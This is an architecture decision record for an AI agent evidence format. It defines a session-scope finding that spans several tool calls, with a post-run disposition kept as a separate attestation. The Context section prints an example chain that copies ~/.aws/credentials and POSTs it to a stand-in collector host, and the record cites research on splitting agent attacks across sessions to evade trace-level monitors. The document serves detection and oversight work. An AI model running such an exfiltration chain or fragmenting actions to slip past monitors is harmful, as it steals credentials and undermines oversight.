# ADR-047: A session-scope finding is an event; a post-run disposition is not

- Status: Accepted
- Date: 2026-08-07
- Supersedes: none
- Amends: ADR-045 — states the seal's scope boundary explicitly. It does not change the seal.

## Context

[#2105](https://github.com/Rul1an/assay/issues/2105) records an observation by
[@blitzcrieg1](https://github.com/blitzcrieg1) on
[microsoft/agent-governance-toolkit#276](https://github.com/microsoft/agent-governance-toolkit/discussions/276).
Three tool calls, each recorded `allow / success` and each correct in isolation:

```
ls -la /srv/app
cat ~/.aws/credentials > /tmp/k
curl -X POST https://collector.example.com/u -d @/tmp/k
```

One finding exists across the three, and no per-call gate can see it without ceasing to be a
per-call gate. His layering — enforcement is per-call, correlation is session-scope, portable
evidence has to carry both — is his, and so is the argument that a later operator judgement
("reviewed, benign, at this time, for this reason") cannot ride on an envelope that models only
pre-execution authorization.

What is ours is the measurement against this tree, at `f842bbab5`, and three decisions it forces.

## Decision 1 — a session-scope finding is its own payload kind, carried in the event stream

`assay.session.finding`, carried by `PayloadSessionFinding`.

**Shipped in two steps, and the reason is a gate rather than a preference.** The record type ships
now; wiring it into the `Payload` enum does not. `cargo semver-checks` refuses the variant against
the `v4.0.0` baseline — `enum_variant_added: enum variant added on exhaustive enum` — while the
struct alone reports "no semver update required". `Payload` is `pub` in a published crate and is
exhaustive, so **every future event kind costs a major version**, which is a poor property for the
enum of a format designed to grow.

So the next major takes both at once: the variant and `#[non_exhaustive]` on `Payload`. That pays
the break once for every kind that follows rather than once per kind. Until then the wire is
unaffected — `EvidenceEvent::payload` is a raw `Value`, a consumer parses `PayloadSessionFinding`
from it directly, and the enum was already documented as a convenience view rather than the
contract.

**Why a distinct kind rather than a field on `assay.tool.decision`.** The defining property of this
record is that it *spans* calls. A per-call payload has no honest place to put a span: whichever
call carried it would be claiming a verdict it did not alone produce. `RuleEvaluation`
(`crates/assay-core/src/sequence_eval.rs`, #2112) already models this correctly with
`spanned: Vec<usize>` — the call indices the rule actually read. The producer shape exists; only
the carrier was missing.

**Why the event stream rather than a sibling file.** This looked like a free choice and is not.
The manifest carries `files: BTreeMap<String, FileMeta>`, which suggested a second file was
additive. Two facts close it:

- `ALLOWED_FILES` in `bundle/writer_next/verify.rs` is `["manifest.json", "events.ndjson"]`, and it
  is enforced on the verify path at `verify.rs:235` before the manifest is consulted. A sibling
  file is rejected, so it is a format change, not an addition. (`BundleReader` does not enforce it;
  this is a property of the verify path, not of the format.)
- `verify_bundle` never iterates `m.files` for completeness. It does one `m.files.get("events.ndjson")`
  and gates on `events_verified`, so **a manifest listing a file absent from the archive verifies
  clean.** A record in a sibling file could therefore be dropped without breaking verification.

The second point is the load-bearing one and an earlier draft got it wrong, arguing instead that a
sibling file would sit outside `run_root`. That is literally true and proves nothing: `events.ndjson`
is not covered by `run_root` either. Its *bytes* are covered by `m.files["events.ndjson"].sha256`, a
generic mechanism a sibling file would share. And since ADR-044 the attestation subject is the
SHA-256 of the whole completed archive (`attestation.rs:131`), which covers any sibling file, gzip
trailer included — so for an attested bundle the droppability claim is false outright.

What remains, and what decides this, is the unattested case plus a verifier that does not check its
own manifest for completeness. A finding an attacker can drop without breaking verification is the
one thing an evidence format must not permit of its own records. In the event stream the record is
covered by the same chain as the calls it spans, with no change to the file set. Whether
`verify_bundle` should enumerate `m.files` is a separate defect and is not repaired here.

**Why now rather than when a producer needs it.** The first draft of this ADR argued that
`Payload::Unknown(serde_json::Value)` would absorb such a record untyped, so that not deciding
guaranteed a bad default. Writing the test refuted it, and the real answer is sharper.

`Unknown` is not a catch-all. On an adjacently-tagged enum with no `#[serde(other)]` it matches the
literal tag `"Unknown"` and nothing else, which no producer emits. An unregistered kind is
therefore a **hard deserialisation error** in the typed view, not a soft landing. The wire itself
is unaffected — `EvidenceEvent::payload` is a raw `Value`, and this enum is documented as a
convenience view rather than the contract.

So registering the variant is the difference between a consumer of the typed view reading this
record and failing on it. Stated at its true size: today there are **no production consumers of
`Payload` at all** — it is referenced only from tests, while `lint/`, `diff/` and
`trust_basis/classifiers.rs` each read the raw `Value`. So this is not urgent in the sense of
unblocking anyone. It is cheap now and a migration later, and the record can already be produced
and shipped without it.

(That `Unknown` looks like a fallback and is not is a defect in its own right, filed as #2123. It
is not repaired here, because changing it changes how every unrecognised payload behaves and that
deserves its own argument.)

**Why the name carries the scope.** There is a class above this one. Context-Fractured
Decomposition ([arXiv 2606.09084](https://arxiv.org/html/2606.09084v1)) distinguishes itself from
STAC precisely there: STAC "operates within a single contiguous trajectory and a single session, so
the full chain is in principle visible to a trace-level monitor", while CFD's defining property is
"the cross-session artifact channel that survives context resets". `assay.session.finding` says session, so nothing reads it as
covering a class it structurally cannot see.

**What we are not copying, and why.** OCSF faced this question and declined to pick one shape,
keeping `detection_finding` alongside a Security Control profile on activity classes and adding a
flag to both so one query can reach either ([ocsf/ocsf-schema#1177](https://github.com/ocsf/ocsf-schema/issues/1177)).
That discriminator exists to reunify two shapes. We are introducing one, on a tagged enum where the
variant is already the discriminator, so importing it would add a field that answers a question we
do not have. If a second shape ever appears, this is the precedent to revisit.

Two corrections to how this ADR first cited it. The attribute that shipped is **`is_alert`**, via
ocsf/ocsf-schema#1178 (merged 2024-09-27), not `is_detection` — that name appears only in the
issue's proposal, where it was contested, and exists nowhere in the schema. And issue #1177 is
still open, so "declined to pick a side" describes the substance rather than a closed resolution.
`is_alert` is also narrower than a uniform-query flag: its own description has a `Close` activity
omitting it or setting it false.

## Decision 2 — a post-run disposition is a separate attestation over the same subject, not a wider seal

Not built here. The decision is what it may not become.

ADR-045's seal is a **run-end** primitive: it closes over still-armed state, drop accounting, the
observed set and the run binding at the moment enforcement is still in force. A disposition is
produced minutes or days later and is a claim *about* a record the seal has already closed.

The rule is in-toto's, restated in OpenVEX's embedding guide: "An attestation's predicate is a
singleton. It is a set of exactly one predicate that applies to any number of subjects"
([openvex/spec ATTESTING.md](https://github.com/openvex/spec/blob/main/ATTESTING.md), describing
the in-toto attestation format rather than legislating for it). Attributing it to OpenVEX, as an
earlier draft did, borrowed authority from the wrong document; the constraint holds either way,
and it binds us because our seal *is* an in-toto predicate. Folding a
disposition into the seal's predicate does not widen that predicate, it replaces it — and with it
what a verified seal means. The same pattern already carries the analogous case in the SBOM world:
VEX ships beside the SBOM as a second attestation over the same digest, never as a larger SBOM.

So: when a disposition is built, it binds to the same subject with its own predicate, its own
basis and its own signer. The seal's scope stays the run.

## Decision 3 — argument-level sequence correlation is deferred, and the carrier does not wait for it

Measured: `crates/assay-metrics/src/sequence_valid.rs` reduces calls with
`.map(|c| c.tool_name.clone())` before evaluation, and `evaluate_rules` takes
`actual_names: &[String]`. Every `SequenceRule` variant keys on names. No metric in the workspace
correlates arguments across calls.

So the demonstration that motivates #2105 is not expressible in our rule language today: what makes
it a finding is *which* file and *which* host, and those are arguments. #2105's body claimed
otherwise and has been corrected.

That gap is real and is filed as #2124. It does not block this ADR, because **the carrier is
independent of who produces the finding.** A session-scope finding may come from our own evaluator,
from a proxy correlator, or from an external system such as the one @blitzcrieg1 describes. Holding
the record shape hostage to our own detector's reach would be the same error as deciding the format
by what today's producer happens to emit.

**Update, 2026-08-08: the gap is closed and this decision's premise no longer holds.** #2124 landed
`CallSelector`, so a rule step is a tool name *and* optionally a constraint on the call's arguments,
and `evaluate_rules` now reads calls rather than names. The motivating correlation is expressible in
our own rule language: the three `bash` calls are distinguished by `args_match`, and the rule spans
the two that constitute the finding rather than the first pair sharing a tool name.

The reasoning above is left standing rather than rewritten, because it is the argument for why the
carrier shipped first and it is still the right argument. What changed is only the fact it was
reasoning about. Deciding the format by our detector's reach would have delayed the carrier for
work that took one predicate.

## Consequences

- `PayloadSessionFinding` is additive; `Payload` is unchanged until the next major, when it gains
  the variant and `#[non_exhaustive]` together. Nothing in the workspace matches `Payload`
  exhaustively today anyway — the one existing match is in a test and has a wildcard arm — and
  `Unknown` never absorbed this class, as Decision 1 records.
- Findings enter `run_root`, so they are covered by bundle verification with no new file and no
  change to `ALLOWED_FILES`.
- The span is expressed as `u64` indices into the evaluated call sequence, which is what the
  producer knows. `RuleEvaluation` uses `usize` because those are in-memory indices; a wire format
  re-read by third parties on other machines must not be platform-width. It is meaningful relative to the trace the finding was computed over and this is stated on
  the field rather than implied. Binding spans to event content hashes is a larger change and is
  not required to make this record honest.
- The trace extent travels with the finding, as a string. `TraceExtent` had no rendering at all
  before this change — no `label()`, no `Serialize` — so `"complete"` / `"partial"` would have been
  invented here, which is worse than duplicating a vocabulary because there is no source to drift
  from. `TraceExtent::label()` is added alongside, and `tests/session_finding_vocabulary_parity.rs`
  pins both vocabularies against their definitions in `assay-core`.
  The distinction is worth carrying: a violation found on a partial trace and one found on a
  finished run are different claims, and #2112 established that the difference is invisible in the
  rules and the trace — it is only in who is asking.
  Extent makes **no fidelity claim**: `complete` must not be read as "nothing is missing". A
  compacted session can be finished, so temporal completeness and record faithfulness are
  orthogonal. A producer-declared coverage field on that second axis waits for a planned
  major (with `#[non_exhaustive]` on the finding) rather than a third `TraceExtent` variant
  (#2422).
- ADR-045 is unchanged. This ADR states its boundary so that a future disposition proposal has to
  argue against a written decision rather than into a gap.

## Not decided here

Whether `assay.session.finding` is emitted by any command today. This ADR admits the kind to the
format; wiring a producer is separate work and gets its own review.
